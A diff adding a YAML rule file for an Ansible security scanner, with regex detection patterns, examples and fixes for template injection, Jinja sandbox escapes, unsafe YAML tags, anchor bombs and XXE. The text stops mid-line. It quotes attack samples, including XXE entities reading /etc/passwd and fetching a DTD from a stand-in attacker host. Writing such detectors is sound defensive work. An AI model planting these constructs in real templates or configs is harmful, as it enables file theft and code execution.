@@ -1,0 +1,467 @@
+name: "Template Injection Patterns"
+author: "Ansible Security Scanner Team"
+description: "Detects template injection vulnerabilities and unsafe variable usage"
+
+patterns:
+  - id: "unquoted_template_variable"
+    category: "template_injection"
+    severity: "HIGH"
+    title: "Unquoted Template Variable in Shell Command"
+    description: "A ``shell`` or ``raw`` task interpolates a Jinja variable WITHOUT wrapping the whole module value in quotes and WITHOUT applying the ``| quote`` filter to the variable. The rendered variable is then subject to shell word-splitting and glob expansion - if the value contains a space or metachar the task silently mis-executes or opens a shell-injection vector. ``command:`` is EXCLUDED because it does not invoke a shell - argv is tokenised by Ansible, so spaces / metachars in the rendered variable can't cause word-splitting. Variables protected with ``{{ var | quote }}`` are also EXCLUDED because the ``quote`` filter is Ansible's canonical shell-escape. Always quote the entire ``shell:`` / ``raw:`` value or apply ``| quote`` to each interpolation."
+    # Fire only when the module is ``shell`` or ``raw`` (both run the
+    # value through ``/bin/sh -c``) AND the value itself is NOT quoted.
+    # ``command:`` is excluded - it does ``execve(argv[])`` without a
+    # shell, so an unquoted ``{{ var }}`` is NOT a shell-injection
+    # surface. That single omission removes the dominant FP class on
+    # real corpora where operators write ``command: /usr/bin/tool
+    # {{ arg }}`` as the deliberately non-shell form. The old regex
+    # used negative look-arounds on the chars immediately adjacent to
+    # ``{{``/``}}`` which also matched the safe shape ``command: "...
+    # {{ var }} ..."`` (outer quote far from template but whole string
+    # IS quoted); this regex anchors on the module key and requires
+    # the first non-whitespace char after ``key:`` to be neither a
+    # quote nor a YAML scalar indicator (``|`` / ``>``).
+    #
+    # Two additional carve-outs reduce real-world FPs without loss of
+    # signal:
+    #   1. ``{{ var | quote }}`` - Ansible's canonical shell-escape
+    #      filter; rendered value is already ``'...'``-wrapped by Jinja.
+    #   2. Jinja brace-escape idiom - ``{{ '{{' }}`` / ``{{ '}}' }}``
+    #      renders a LITERAL ``{{`` / ``}}``, commonly used when the
+    #      shell payload embeds a Go/Docker/Helm template (``docker ps
+    #      --format "{{ '{{' }}.State{{ '}}' }}"``). The rendered
+    #      output is not a variable value at all; it's two bytes of
+    #      brace literal.
+    regex: "^(?!\\s*#)\\s*(?:shell|raw|ansible\\.builtin\\.(?:shell|raw)):[ \\t]+(?![\"'|>])[^\\n]*?(?<!['\"])\\{\\{(?![^}]*\\|\\s*quote\\b)(?!\\s*['\"]\\{\\{['\"]\\s*\\}\\})(?!\\s*['\"]\\}\\}['\"]\\s*\\}\\})[^}]+\\}\\}"
+    positive_examples:
+      - "    shell: curl https://api.example.com/{{ path }}"
+      - "    raw: systemctl restart {{ svc }}"
+      - "    ansible.builtin.shell: /bin/echo {{ user_msg }}"
+    negative_examples:
+      - "    shell: \"curl -u admin:{{ pw }} https://api.example.com/\""
+      - "    shell: 'curl -u admin:{{ pw }} https://api.example.com/'"
+      - |2-
+            shell: |-
+              curl https://api.example.com/{{ path }}
+      - |2-
+            shell: >-
+              example-cli --flag {{ value }}
+      - "    ansible.builtin.command: \"/opt/tool --id {{ item }}\""
+      - "    command: /bin/echo {{ user_msg }}"
+      - "    command: openssl rsa -in {{ directory_name }}/default/{{ server_prefix }}_server.pem"
+      - "    shell: cat /etc/letsencrypt/live/{{ domain_name | quote }}/fullchain.pem"
+      - "    shell: docker ps --filter \"name=app\" --format \"{{ '{{' }}.State{{ '}}' }}\""
+      - "    shell: kubectl get pods -o jsonpath=\"{{ '{{' }}.items[0].metadata.name{{ '}}' }}\""
+    recommendation: "Either wrap the entire shell: value in quotes AND apply | quote to every interpolated variable (shell: \"echo {{ msg | quote }}\"), or - preferred - switch to ansible.builtin.command with the argv list form so the shell is not involved at all."
+    cwe: ["CWE-78", "CWE-1336"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ['T1059.004']
+    cis_controls: ['CIS-16.10']
+    nist_controls: ['SI-3', 'SI-10']
+    pci_dss: ['6.2.4', '6.3.1']
+    soc2: ['CC7.1']
+
+  - id: "template_in_sql_query"
+    category: "template_injection"
+    severity: "HIGH"
+    title: "Template Variable in SQL Query"
+    description: "Template variable directly embedded in a SQL query string - classic CWE-89 SQL injection surface when the variable is attacker-influenced."
+    # Require a real SQL shape, not just the keyword ``SELECT`` /
+    # ``INSERT`` / ``UPDATE`` / ``DELETE`` appearing anywhere in a
+    # string. The previous regex matched JSON-body documentation
+    # strings (``"INSERT SENDER EMAIL HERE"``, ``"several of these
+    # methods"``) followed much later by an unrelated ``{{ var }}``
+    # on the same huge line. Real SQL has ``SELECT ... FROM``,
+    # ``INSERT INTO``, ``UPDATE ... SET``, or ``DELETE FROM`` - the
+    # keyword+structural-clause pair is what makes it SQL.
+    regex: "(?i)\\b(?:SELECT\\s+[\\w*,.\\s]+\\s+FROM|INSERT\\s+INTO|UPDATE\\s+\\w+\\s+SET|DELETE\\s+FROM)\\b[^\\n]{0,300}?\\{\\{[^}]+\\}\\}"
+    positive_examples:
+      - "    query: \"SELECT * FROM users WHERE id = {{ user_id }}\""
+      - "    sql: \"INSERT INTO events (name) VALUES ('{{ event_name }}')\""
+      - "    stmt: \"UPDATE users SET role = '{{ role }}' WHERE id = 1\""
+      - "    stmt: \"DELETE FROM sessions WHERE token = '{{ token }}'\""
+    negative_examples:
+      - "    body: '{\"description\": \"INSERT SENDER EMAIL HERE\"}' -u admin:{{ pw }}"
+      - "    msg: \"Call the UPDATE API to refresh {{ target }}\""
+      - "    desc: \"several of these methods {{ item }}\""
+    recommendation: "Do not concatenate user-controlled values into the SQL string; pass them via the module's parameter binding (community.mysql.mysql_query named_args:, community.postgresql.postgresql_query named_args:) so the driver handles quoting and prevents CWE-89."
+    cwe: ["CWE-89", "CWE-1336"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ['T1190']
+    cis_controls: ['CIS-16.10']
+    nist_controls: ['SI-10']
+    pci_dss: ['6.2.4']
+    soc2: ['CC7.1']
+
+  - id: "template_in_file_path"
+    category: "template_injection"
+    severity: "MEDIUM"
+    title: "Template Variable in File Path"
+    description: "Untrusted template variable used in file paths without validation - potential path-traversal sink"
+    # Fire when a ``src:``/``dest:``/``path:`` argument interpolates
+    # a Jinja expression whose variable name signals untrusted or
+    # externally-supplied input. Two signals qualify:
+    #   1. The expression starts with an untrusted-input token
+    #      (``user_*``, ``input_*``, ``request``, ``params``, etc.)
+    #      - e.g. ``{{ user_dir }}``, ``{{ request.args.filename }}``.
+    #   2. The expression contains a known path/attacker-controlled
+    #      sentinel (``config_path``, ``attacker_*``, ``untrusted_*``,
+    #      ``external_*``).
+    # Plain role-var interpolation such as ``{{ webapp_install_dir }}``
+    # or ``{{ webapp_runtime_user }}`` - where ``user`` is a SUFFIX
+    # token inside an internal name - must NOT fire.
+    regex: "(?:src|dest|path):\\s*[\"']?[^\"'\\n]*\\{\\{\\s*(?:user_|input_|attacker_|untrusted_|external_|unsafe_|raw_)[a-z0-9_]+|(?:src|dest|path):\\s*[\"']?[^\"'\\n]*\\{\\{\\s*(?:config_path|request|params?|query_params?|query_string|inputs?|unsafe|raw)\\b"
+    positive_examples:
+      - "path: ${{ inputs.artifact-path }}"
+    recommendation: "Validate the user-controlled path against an allow-list and resolve it under a controller-trusted base directory before passing to src: / dest: / path:; ansible.builtin.assert that the resolved path stays within the intended root to prevent traversal."
+    cwe: ["CWE-22", "CWE-1336"]
+    owasp_appsec: ["A01:2021"]
+    owasp_asvs: ["V12.3.1", "V12.3.5"]
+    mitre_attack: ['T1059', 'T1083']
+    cis_controls: ['CIS-16.10']
+    nist_controls: ['SI-10']
+    pci_dss: ['6.2.4']
+    soc2: ['CC7.1']
+
+  - id: "user_input_template"
+    category: "template_injection"
+    severity: "HIGH"
+    title: "User Input in Template"
+    description: >-
+        {{ ... user_input / input / inputs / request / params / query_string ... }}
+        appears in template output. Untrusted input rendered through Jinja2 enables
+        SSTI when the engine exposes attribute access to dunder methods.
+    # Require the untrusted-input indicator to be a distinct
+    # identifier token (bounded by ``{{``/``.``/whitespace/end),
+    # not a substring of a longer role var. ``webapp_runtime_user``
+    # must NOT match - ``user`` is internal; ``{{ user_input }}``,
+    # ``{{ request.args.q }}``, ``{{ params.id }}``,
+    # ``{{ input.body }}`` MUST match. The leading ``[^}]*`` allows
+    # filter prefixes (``{{ foo | default(user_input) }}``).
+    regex: "\\{\\{[^}]*(?:^|[\\s.|(])(?:user_input|user_input_\\w+|input|inputs|request|params?|query_params?|query_string)\\b[^}]*\\}\\}"
+    positive_examples:
+      - "msg: \"{{ input | community.general.json_diff(target) }}\""
+    recommendation: "Treat any variable named user_input / request / params / query as untrusted: validate it (regex / type / range) with ansible.builtin.assert before use, and if it must reach a shell, wrap it in | quote."
+    cwe: ["CWE-20", "CWE-1336"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ['T1059']
+    cis_controls: ['CIS-16.10']
+    nist_controls: ['SI-10']
+    pci_dss: ['6.2.4']
+    soc2: ['CC7.1']
+
+  - id: "template_command_substitution"
+    category: "template_injection"
+    severity: "HIGH"
+    title: "Jinja Variable Rendered Into $(...) / backtick Substitution"
+    description: "A ``shell``/``command``/``raw``/``template``/``msg`` value uses ``$(...)`` or backticks AND interpolates a Jinja variable inside the substitution. The rendered value is re-parsed by the inner shell - this is a command-injection vector distinct from the outer template context because ``| quote`` on the outer string does NOT escape bytes inside a nested ``$(...)``. Plain ``$(sha512sum file)`` or ``$(basename $f)`` WITHOUT a Jinja interpolation is a standard shell idiom and is not flagged."
+    # Require a Jinja ``{{ var }}`` token INSIDE the ``$(...)`` or
+    # backtick substitution - the genuine risk shape.
+    regex: "(?:shell|command|raw|template|msg):[\\s\\S]{0,400}?(?:\\$\\([^)]*\\{\\{[^}]+\\}\\}[^)]*\\)|`[^`]*\\{\\{[^}]+\\}\\}[^`]*`)"
+    multiline: true
+    window: 8
+    positive_examples:
+      - "    shell: user=$(id {{ target_user }})"
+      - "    msg: \"hostname: $(hostname {{ arg }})\""
+      - "    raw: result=`echo {{ input }} | sha256sum`"
+    negative_examples:
+      - "    shell: echo \"$(sha512sum splunk-edge.tar.gz)\" | cut -d ' ' -f 1"
+      - "    shell: for f in *; do name=$(basename $(dirname \"$f\")); done"
+      - "    msg: \"currently installed: $(rpm -q splunk)\""
+      - "    shell: ts=$(date +%Y%m%d)"
+    recommendation: "Replace $(...) / backticks containing {{ var }} with a register: from a preceding ansible.builtin.command (or a set_fact: built from a module result), so the inner shell never re-parses templated bytes."
+    cwe: ["CWE-78", "CWE-1336"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ['T1059.004']
+    cis_controls: ['CIS-16.10']
+    nist_controls: ['SI-3', 'SI-10']
+    pci_dss: ['6.2.4', '6.3.1']
+    soc2: ['CC7.1']
+
+  # -- Jinja2 template file hardening -------------------------------------
+  # These rules target DANGEROUS constructs that appear inside Jinja2
+  # templates (.j2) - template authors often don't think of a template
+  # as "code", but a bad {% raw %} / {{ }} / {% set %} choice can leak
+  # secrets, skip HTML-escaping, or render attacker-controlled shell.
+  - id: "jinja2_safe_filter_on_user_input"
+    category: "template_injection"
+    severity: "HIGH"
+    title: "Jinja2: |safe filter applied to a variable (bypasses autoescape)"
+    description: "The |safe filter in a Jinja2 template marks a variable as pre-escaped HTML. If that variable carries any user-controlled data (inventory var, lookup result, module output, HTTP payload), autoescape is bypassed and XSS / HTML injection is trivial."
+    regex: "\\{\\{\\s*[^}]+\\|\\s*safe\\b"
+    positive_examples:
+      - "{{x|safe"
+    recommendation: "Remove |safe. If the value is genuinely already-escaped HTML from a trusted source, wrap that source (not the template) in a Markup() call, or use a dedicated `safe_html` filter that enforces a strict allow-list."
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7']
+    pci_dss: ['2.2.1', '2.2.4']
+    soc2: ['CC7.1', 'CC8.1']
+    mitre_attack: ["T1059.007"]
+    cwe: ["CWE-79", "CWE-116"]
+    owasp_appsec: ["A03:2021"]
+
+  - id: "jinja2_autoescape_false"
+    category: "template_injection"
+    severity: "HIGH"
+    title: "Jinja2: autoescape disabled explicitly"
+    description: "A Jinja2 template sets `#jinja2: autoescape:False` (or autoescape: false in a template's frontmatter), disabling HTML autoescape for the whole file. Any {{ var }} that renders to HTML is vulnerable to XSS."
+    regex: "(?:#\\s*jinja2:.*autoescape\\s*:\\s*[Ff]alse\\b|autoescape\\s*:\\s*[Ff]alse)"
+    positive_examples:
+      - "#jinja2:autoescape:False"
+    recommendation: "Leave autoescape enabled (default for .html/.xml templates). If you need raw output in a specific block, use `{% autoescape false %}...{% endautoescape %}` around the minimum scope, or output through Markup() in Python."
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7']
+    pci_dss: ['2.2.1', '2.2.4']
+    soc2: ['CC7.1', 'CC8.1']
+    mitre_attack: ["T1059.007"]
+    cwe: ["CWE-79", "CWE-116"]
+    owasp_appsec: ["A03:2021"]
+
+  - id: "jinja2_render_sensitive_var"
+    category: "template_injection"
+    severity: "HIGH"
+    title: "Jinja2: template renders a likely-secret variable"
+    description: "A Jinja2 template renders {{ something_password }} / {{ api_token }} / {{ jwt_secret }} etc. Unless the template is writing a locked-down config file (0600) that's fine - but the pattern of rendering secrets into world-readable config files / html / json is a top-3 real-world leak vector."
+    regex: "\\{\\{\\s*[a-zA-Z_][a-zA-Z0-9_]*(?:_password|_passwd|_pw|_pass|_secret|_token|_api_key|_apikey|_private_key)\\s*[}|]"
+    positive_examples:
+      - "dest: '{{ ssh_private_key }}'"
+    recommendation: "Move secrets OUT of template output and into Kubernetes Secret / systemd EnvironmentFile / Vault-sidecar reads at runtime. If the template truly must embed a secret, ensure the rendered file has mode 0600 and an owner that matches the service."
+    cis_controls: ["CIS-Secrets"]
+    nist_controls: ['AC-3', 'AU-9', 'IA-5(7)', 'SC-28']
+    pci_dss: ['3.3.1', '3.5.1', '8.6.2', '10.3.1', '10.3.2']
+    hipaa: ['164.312(a)(1)', '164.312(a)(2)(i)', '164.312(b)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.1', 'CC6.7']
+    mitre_attack: ["T1552.001"]
+    cwe: ["CWE-200", "CWE-532"]
+    owasp_appsec: ["A01:2021", "A09:2021"]
+    owasp_asvs: ["V7.1.1", "V8.1.1"]
+
+  - id: "jinja2_eval_via_attr"
+    category: "template_injection"
+    severity: "CRITICAL"
+    title: "Jinja2: access to __class__ / __mro__ / __subclasses__ / __globals__ (sandbox escape)"
+    description: "Classic Jinja2 sandbox-escape primitives. If the template is ever rendered with attacker-influenced vars, these expose arbitrary Python object traversal and ultimately arbitrary code execution."
+    regex: "\\{\\{[\\s\\S]*?(?:__class__|__mro__|__subclasses__|__globals__|__builtins__|__import__)[\\s\\S]*?\\}\\}"
+    positive_examples:
+      - "{{__class__}}"
+    multiline: true
+    window: 4
+    recommendation: "Never expose __class__, __mro__, __subclasses__, __globals__, __builtins__, __import__ in a rendered template. If you found this in an Ansible template, it's almost always intentional malware or a pentest fixture - remove it."
+    cis_controls: ["CIS-1.1"]
+    nist_controls: ['SI-3', 'SI-10']
+    pci_dss: ['6.2.4', '6.3.1']
+    soc2: ['CC7.1']
+    mitre_attack: ["T1027", "T1059.007"]
+    cwe: ["CWE-94", "CWE-917", "CWE-1336"]
+    owasp_appsec: ["A03:2021"]
+
+  - id: "jinja2_lookup_pipe_in_template"
+    category: "template_injection"
+    severity: "HIGH"
+    title: "Jinja2: lookup('pipe', ...) / lookup('url', ...) inside a template"
+    description: "A Jinja2 template invokes ``lookup('pipe', <cmd>)`` or ``lookup('url', <url>)``. The command / URL executes on the controller during template render - if any part is interpolated from a variable, it's an RCE/SSRF primitive the template author can easily miss."
+    regex: "\\{\\{(?:[^{}]|\\{[^{]|\\}[^}])*?lookup\\(\\s*['\"](?:pipe|url)['\"](?:[^{}]|\\{[^{]|\\}[^}])*?\\}\\}"
+    multiline: true
+    window: 4
+    recommendation: "Move the lookup out of the template, into a preceding ``set_fact:`` task with a static source. That way the command/URL is reviewable as a plain task rather than hidden inside rendered text."
+    positive_examples:
+      - "    pkg_root: \"{{ lookup('pipe', 'brew --prefix') }}\""
+      - "    payload: \"{{ lookup('url', 'https://example.com/data.json') }}\""
+    negative_examples:
+      - "    home: \"{{ lookup('env', 'HOME') }}\""
+      - "    pw: \"{{ lookup('password', '/dev/null length=8') }}\""
+      - "    hosts: \"{{ lookup('inventory_hostnames', 'web') }}\""
+      - "    cfg: \"{{ lookup('file', '{{ playbook_dir }}/cfg.yml') }}\""
+    cis_controls: ["CIS-4.2"]
+    nist_controls: ['SI-3', 'SI-10']
+    pci_dss: ['6.2.4', '6.3.1']
+    soc2: ['CC7.1']
+    mitre_attack: ["T1059.007", "T1105"]
+    cwe: ["CWE-78", "CWE-1336"]
+    owasp_appsec: ["A03:2021"]
+
+  - id: "jinja2_set_from_env"
+    category: "template_injection"
+    severity: "MEDIUM"
+    title: "Jinja2: {% set %} value pulled from controller env var"
+    description: "A `{% set x = lookup('env', 'SOMETHING') %}` in a Jinja2 template reads a controller-side environment variable at render time and bakes it into the rendered file. This exfiltrates controller env (SSH keys, cloud creds, CI secrets) into the output file if the variable name is ever attacker-influenced."
+    regex: "\\{%\\s*set\\s+[^%]+=\\s*lookup\\(\\s*['\"]env['\"]"
+    positive_examples:
+      - "{%set x=lookup('env'"
+    recommendation: "Replace with a preceding Ansible task: `- set_fact: x: \"{{ lookup('env', 'SOMETHING') }}\"` guarded by `no_log: true` on the task. That way the lookup is visible in the playbook and can be scanned, rather than hidden in template text."
+    cis_controls: ["CIS-Secrets"]
+    nist_controls: ['IA-5(7)', 'SC-28']
+    pci_dss: ['3.5.1', '8.6.2']
+    hipaa: ['164.312(a)(2)(i)']
+    soc2: ['CC6.1']
+    mitre_attack: ["T1552.001"]
+    cwe: ["CWE-526"]
+    owasp_appsec: ["A05:2021"]
+
+  - id: "jinja2_comment_contains_todo_secret"
+    category: "template_injection"
+    severity: "LOW"
+    title: "Jinja2: {# #} comment mentions TODO/FIXME + secret-shaped word"
+    description: "A Jinja2 {# ... #} comment mentions TODO/FIXME along with a credential-shaped word (password, token, secret, api_key). Often these are 'TODO: hardcoded for now, rotate later' notes that never get rotated - they're a leak indicator for reviewers even if the current value is placeholder."
+    regex: "\\{#[\\s\\S]{0,200}?(?:TODO|FIXME|HACK|XXX)[\\s\\S]{0,200}?(?:password|passwd|secret|token|api[_-]?key|private[_-]?key)[\\s\\S]{0,200}?#\\}"
+    positive_examples:
+      - "{#TODOpassword#}"
+    multiline: true
+    window: 4
+    recommendation: "Resolve the TODO: either remove the credential entirely (use a runtime secret lookup) or rotate it AND remove the comment so there's no future leak trail. Never leave 'TODO: insecure for now' in rendered config."
+    cis_controls: ["CIS-Secrets"]
+    nist_controls: ['AU-9', 'IA-5(7)', 'SC-28']
+    pci_dss: ['3.5.1', '8.6.2', '10.3.1', '10.3.2']
+    hipaa: ['164.312(a)(2)(i)', '164.312(b)']
+    soc2: ['C1.1', 'CC6.1']
+    cwe: ["CWE-532"]
+    owasp_appsec: ["A09:2021"]
+    owasp_asvs: ["V7.1.1"]
+    mitre_attack: ['T1552.001']
+
+  # -- YAML schema abuse --------------------------------------------------
+  # These catch abuse of YAML's own features - unsafe global tags, anchor
+  # bombs (billion-laughs), shadow-reserialisation, and python/object tags
+  # that pyyaml.full_load would execute. Detection is line-based so it
+  # fires BEFORE the yaml parser gets a chance to crash or execute.
+  - id: "yaml_python_object_tag"
+    category: "template_injection"
+    severity: "CRITICAL"
+    title: "YAML: !!python/object or !!python/module tag (deserialisation RCE)"
+    description: "A YAML document uses the !!python/object / !!python/module / !!python/name / !!python/apply tag family. If the file is ever loaded with yaml.load() / yaml.unsafe_load() / yaml.full_load() (any non-safe_load), the tag triggers arbitrary Python object construction = RCE. Even with safe_load this is an intent-to-abuse signal worth flagging."
+    regex: "!!python/(?:object|module|name|apply|tuple|bytes|complex|str/[^\\s]+)(?:/new|/apply)?\\b"
+    positive_examples:
+      - "format: !!python/name:pymdownx.superfences.fence_code_format"
+    recommendation: "Never use !!python/* tags in data files. If you genuinely need a serialised Python object, use a different format (pickle with signing, or protobuf). Always load Ansible YAML with yaml.safe_load."
+    cis_controls: ["CIS-1.1"]
+    nist_controls: ['SI-3', 'SI-10']
+    pci_dss: ['6.2.4', '6.3.1']
+    soc2: ['CC7.1']
+    mitre_attack: ["T1055", "T1059.006"]
+    cwe: ["CWE-94", "CWE-502"]
+    owasp_appsec: ["A03:2021", "A08:2021"]
+    owasp_asvs: ["V10.2.1"]
+    mitre_atlas: ['AML.T0011.000', 'AML.T0010']
+
+  - id: "yaml_binary_tag_on_executable"
+    category: "template_injection"
+    severity: "HIGH"
+    title: "YAML: !!binary tag encoding a suspiciously long blob"
+    description: "A YAML value uses the !!binary tag (base64 in-file). Short binary blobs (tls certs, kerberos keytabs embedded in vars) are legitimate but > 2 KB of base64 often conceals a packed executable, shellcode, or malware binary smuggled into a playbook. Flag the pattern for review."
+    regex: "!!binary\\s+[|>]?[\\s\\S]{2048,}"
+    positive_examples:
+      - "!!binary                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 "
+    multiline: true
+    window: 60
+    recommendation: "Move large binary payloads out of YAML into ansible.builtin.get_url (fetch from artifact repo) or ansible.builtin.copy with src: files/. Never paste multi-KB base64 into a playbook - it's uninspectable and is the classical way malware is smuggled through PR review."
+    cis_controls: ["CIS-4.3"]
+    nist_controls: ['SI-3', 'SI-7']
+    soc2: ['CC6.8']
+    mitre_attack: ["T1027"]
+    cwe: ["CWE-506"]
+    pci_dss: ['2.2.1']
+
+  - id: "yaml_anchor_bomb_potential"
+    category: "template_injection"
+    severity: "HIGH"
+    title: "YAML: anchor expanded many times (billion-laughs / anchor-bomb)"
+    description: "A YAML anchor (&name) is referenced (*name) 8+ times within a short window, or a referenced value itself contains further references. This is the billion-laughs / anchor-bomb pattern: each level multiplies memory consumption exponentially and can DoS the parser."
+    regex: "&[a-zA-Z_][a-zA-Z0-9_]*\\b[\\s\\S]{0,600}?(?:\\*[a-zA-Z_][a-zA-Z0-9_]*\\b[\\s\\S]{0,200}?){8,}"
+    positive_examples:
+      - |2
+        a: &x [1,2]
+        b: [*x, *x, *x, *x, *x, *x, *x, *x, *x]
+    multiline: true
+    window: 40
+    recommendation: "Cap anchor re-use to 3-4 aliases per file. If you need a lot of repetition, use a task loop / loop-over-dict instead of YAML anchors. Configure ansible-lint or yamllint to error on >5 aliases from the same anchor."
+    cis_controls: ["CIS-4.3"]
+    mitre_attack: ["T1499.002"]
+    cwe: ["CWE-400", "CWE-776"]
+    owasp_appsec: ["A05:2021"]
+    owasp_asvs: ["V14.1.3"]
+    nist_controls: ['AC-11', 'CM-6', 'SC-5', 'SI-10']
+    pci_dss: ['2.2.1', '6.3.1']
+    soc2: ['A1.1', 'CC6.1', 'CC7.1']
+
+  - id: "yaml_merge_key_with_secret"
+    category: "template_injection"
+    severity: "MEDIUM"
+    title: "YAML: merge key (<<) pulls in a map that contains secret-shaped keys"
+    description: "YAML merge key `<<: *anchor` pulls every key from the anchored map into the current map. If the anchored map carries a key matching a secret pattern (*_password, *_token, *_secret, *_api_key), merging silently scatters that secret into every place the anchor is referenced. Review each merge site individually."
+    regex: "<<:\\s*\\*[a-zA-Z_][a-zA-Z0-9_]*[\\s\\S]{0,600}?(?:_password|_passwd|_secret|_token|_api_key|_apikey|_private_key)\\s*:"
+    positive_examples:
+      - |2-
+        <<: *clear_bios_job
+              # ...
+              idrac_password:
+    multiline: true
+    window: 30
+    recommendation: "Either (1) move the secret out of the anchor into a dedicated vars file that's explicitly included where needed, or (2) replace `<<: *anchor` with explicit keys so reviewers can see exactly which keys (including secrets) end up in each map."
+    cis_controls: ["CIS-Secrets"]
+    nist_controls: ['AC-3', 'AU-9', 'IA-5(7)', 'SC-28']
+    pci_dss: ['3.3.1', '3.5.1', '8.6.2', '10.3.1', '10.3.2']
+    hipaa: ['164.312(a)(1)', '164.312(a)(2)(i)', '164.312(b)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.1', 'CC6.7']
+    cwe: ["CWE-200", "CWE-532"]
+    owasp_appsec: ["A01:2021", "A09:2021"]
+    owasp_asvs: ["V7.1.1", "V8.1.1"]
+    mitre_attack: ['T1552.001']
+
+  - id: "yaml_duplicate_key_suppression"
+    category: "template_injection"
+    severity: "MEDIUM"
+    title: "YAML: duplicate key in the same map (silent override)"
+    description: "The same key appears twice in the same YAML map - PyYAML silently keeps the LAST value. If the file is reviewed bottom-up or in split diff, a reviewer can easily miss that an early security-relevant value (e.g. `no_log: true`) is shadowed by a later `no_log: false`."
+    regex: "^(\\s*)([a-zA-Z_][a-zA-Z0-9_-]*):[^\\n]*\\n(?:\\1[^\\s].*\\n)*?\\1\\2:"
+    positive_examples:
+      - |2
+            probe_protocol: "{{pl_protocol}}"
+            probe_protocol: tcp
+    multiline: true
+    window: 30
+    recommendation: "Lint the YAML with `yamllint -d \"{extends: default, rules: {key-duplicates: {level: error}}}\"`. Never rely on the 'last wins' behaviour - make each key appear exactly once."
+    cis_controls: ["CIS-4.3"]
+    cwe: ["CWE-1188"]
+    mitre_attack: ['T1562.001']
+    nist_controls: ['AC-11', 'AU-9', 'CM-6', 'CM-7', 'IR-4', 'SI-4']
+    pci_dss: ['2.2.1', '10.3.4', '12.10.1']
+    hipaa: ['164.312(b)']
+    soc2: ['CC6.1', 'CC7.2']
+
+  - id: "yaml_unsafe_tag_generic"
+    category: "template_injection"
+    severity: "HIGH"
+    title: "YAML: generic !<...> tag that bypasses safe_load type checks"
+    description: "A YAML value uses a fully-qualified !<tag:...> or !!js/function / !!js/regexp / !!perl/* tag family. These are interpreter-specific tags that rely on unsafe loaders - if this file is ever consumed by a non-safe loader it's an RCE vector. Even in Ansible-land this is an intent-to-abuse signal."
+    regex: "(?:!<tag:[^>]+>|!![a-zA-Z]+/(?:function|regexp|ref|array/tagged))"
+    positive_examples:
+      - "!<tag:x>"
+    recommendation: "Remove the explicit tag. Use plain strings / numbers / booleans / sequences / maps - the YAML core schema covers every legitimate Ansible use case."
+    cis_controls: ["CIS-1.1"]
+    mitre_attack: ["T1059.006"]
+    cwe: ["CWE-502"]
+    owasp_appsec: ["A08:2021"]
+    owasp_asvs: ["V10.2.1"]
+    nist_controls: ['CM-8', 'SI-3', 'SI-10']
+    pci_dss: ['6.2.4']
+    soc2: ['CC6.1', 'CC7.1']
+
+  - id: "xxe_doctype_system_external_entity_in_template_or_config"
+    category: "template_injection"
+    severity: "CRITICAL"
+    title: "XML External Entity (XXE) - DOCTYPE With SYSTEM Or PUBLIC External Reference In Template/Config"
+    description: "A task renders an XML template, config file (`web.xml`, `pom.xml`, `log4j2.xml`, SOAP WSDL, XSLT, SVG, DOCX/ODT content), or inline XML string that declares an external entity: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>`, `<!ENTITY % xxe SYSTEM \"http://attacker/evil.dtd\">`, or a `PUBLIC` reference that fetches from `http://`/`https://`/`file://`/`jar:`/`gopher:`. XXE is the classic XML-parser flaw: the default behavior of Java/PHP/Python/.NET XML parsers is to RESOLVE these entities - causing file disclosure (`/etc/passwd`, `/proc/self/environ`), SSRF (attacker-controlled URL fetched from victim server), and on some parsers RCE (`expect:` wrapper in PHP, `jar:` in Java). XXE has been in OWASP Top 10 since 2013 and was #4 in 2017; it dropped out of the 2021 top 10 because it got consolidated into A05 Misconfiguration - but continues to show up in pentests (OpenCVE records 200+ new XXE CVEs per year, 2022-2024). An Ansible playbook deploying config with ANY external entity reference is either (1) a compromised template or (2) intentionally hot."
+    regex: "<!DOCTYPE\\s+\\S+\\s*\\[[\\s\\S]{0,800}?<!ENTITY\\s+(?:%\\s+)?\\S+\\s+(?:SYSTEM|PUBLIC)\\s+['\"][^'\"]*(?:file:|http:|https:|ftp:|gopher:|jar:|netdoc:|php:|expect:)|<!ENTITY\\s+(?:%\\s+)?\\S+\\s+(?:SYSTEM|PUBLIC)\\s+['\"](?:file:|http:|https:|ftp:|gopher:|jar:|netdoc:|php:|expect:)|<\\?xml-stylesheet\\s+[^\\?]*?href\\s*=\\s*['\"](?:file:|http:|https:)[^'\"]+\\.xsl|<xsl:include\\s+href\\s*=\\s*['\"](?:file:|http:)[^'\"]+|<xsl:import\\s+href\\s*=\\s*['\"](?:file:|http:)[^'\"]+"
+    positive_examples:
+      - "<!DOCTYPE 0[<!ENTITY 0 SYSTEM 'file:"
+    multiline: true
+    window: 15
+    recommendation: "NEVER ship XML with a `<!DOCTYPE>` that contains an external `<!ENTITY>` unless there is a documented, reviewed, security-audited need. Disable XXE in every XML parser used by applications you deploy: **Java** (DocumentBuilderFactory): `dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); dbf.setXIncludeAware(false); dbf.setExpandEntityReferences(false);`. **Python** (lxml): `lxml.etree.XMLParser(resolve_entities=False, no_network=True, huge_tree=False)` (use `defusedxml` wholesale). **PHP**: `libxml_disable_entity_loader(true)` (PHP < 8) / don't use `LIBXML_NOENT` in PHP ≥ 8. **.NET**: `XmlReaderSettings { DtdProcessing = Prohibit, XmlResolver = null }`. **Ruby**: `Nokogiri::XML::ParseOptions::NONET | ParseOptions::NOENT` off. Prefer JSON over XML for all new inter-service communication. Validate all user-supplied XML against a strict schema and reject DOCTYPE declarations at the gateway. Scan playbooks + templates: `grep -rnE 